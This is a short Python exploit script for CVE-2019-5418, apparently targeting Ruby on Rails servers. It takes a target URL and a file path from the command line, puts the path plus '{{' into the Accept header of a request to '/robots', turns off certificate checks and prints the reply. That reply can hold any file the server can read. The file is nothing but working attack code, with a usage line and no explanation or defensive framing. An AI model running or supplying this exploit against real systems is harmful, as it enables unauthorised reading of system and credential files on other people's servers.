import sys

import requests

def _attack(url,path):

    header = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0',
                f'Accept': path+'{{',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
                }
    vul_url = url + "/robots"
    response = requests.get(vul_url, timeout=5, verify=False, headers=header)
    result = response.text
    print(result.encode("utf-8"))

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 CVE-2019-5418.py url path")
    else:
        url = sys.argv[1]
        path = sys.argv[2]
        _attack(url,path)
